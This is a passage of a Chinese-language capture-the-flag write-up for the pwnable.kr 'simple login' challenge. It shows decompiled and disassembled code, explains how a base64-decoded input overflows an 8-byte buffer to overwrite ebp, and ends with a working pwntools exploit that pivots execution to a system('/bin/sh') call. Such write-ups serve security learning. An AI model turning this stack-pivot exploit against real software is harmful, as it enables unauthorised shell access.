+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// ST04_1@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+18h] [bp-28h]@1</span></span><br><span class="line">  __int16 v6; <span class="comment">// [sp+1Eh] [bp-22h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [sp+3Ch] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x1E</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Authenticate : "</span>, v3);</span><br><span class="line">  _isoc99_scanf(<span class="string">"%30s"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;v6);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;input, <span class="number">0</span>, <span class="number">0xC</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = Base64Decode(&amp;v6, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0xC</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong Length"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;input, v5, v7);</span><br><span class="line">    <span class="keyword">if</span> ( auth(v7) == <span class="number">1</span> )</span><br><span class="line">      correct();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里经过 <code>Base64Decode()</code> 函数解码后字符串长度不能超过 12bytes，而在 <code>auth()</code> 函数中通过 <code>memcpy()</code> 函数将解码后的字符串复制到自己的函数堆栈中：</p>
+<pre><code>.text:080492A2                 mov     eax, [ebp+arg_0]
+.text:080492A5                 mov     [esp+8], eax    ; i_buf_length (max=0xc)
+.text:080492A9                 mov     dword ptr [esp+4], offset input ; base64 decode string
+.text:080492B1                 lea     eax, [ebp+var_14]
+.text:080492B4                 add     eax, 0Ch        ; [ebp-0x8] buff[8]
+.text:080492B7                 mov     [esp], eax
+.text:080492BA                 call    memcpy          ; memcpy(&amp;(ebp-0x8), &amp;b64d_str, 0xc)
+</code></pre><p>这里可以看到 <code>auth()</code> 函数中只使用了 8bytes 来存储 Base64 解码后的字符串，而允许的解码后的字符串长度为 12bytes，溢出的 4bytes 刚好覆盖了 <code>ebp</code> 的值，在 <code>auth()</code> 函数返回执行 <code>leave; ret</code> 从而可以控制程序流程，因为输入字符串和解码后的字符串都存在了 <code>.bss 0x0811EB40</code> 地址上，所以直接覆盖 <code>ebp</code> 值为 <code>input</code> 变量的地址，并在 <code>0x0811EB40 + 4</code> 处写入需要 RET 的地址即可。</p>
+<p>程序中已经准备好了 <code>system(&quot;/bin/sh&quot;)</code>，所以直接将返回地址控制到该处即可，最终 exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./login'</span>)</span><br><span class="line"></span><br><span class="line">ebp_over = <span class="number">0x0811EB40</span>  <span class="comment"># input .bss</span></span><br><span class="line">pp_system = <span class="number">0x08049284</span> <span class="comment"># system("/bin/sh")</span></span><br><span class="line">payload = b64e(<span class="string">'A'</span> * <span class="number">4</span> + p32(pp_system) + p32(ebp_over))</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#brain-fuck"><span class="toc-number">1.</span> <span class="toc-text">[brain fuck]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-calculator"><span class="toc-number">2.</span> <span class="toc-text">[md5 calculator]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-login"><span class="toc-number">3.</span> <span class="toc-text">[simple login]</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&text=Rookiss Writeup [pwnable.kr]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&is_video=false&description=Rookiss Writeup [pwnable.kr]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Rookiss Writeup [pwnable.kr]&body=Check out this article: http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&title=Rookiss Writeup [pwnable.kr]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/07/25/rookiss-writeup-pwnable-kr/&name=Rookiss Writeup [pwnable.kr]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 RickGray
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
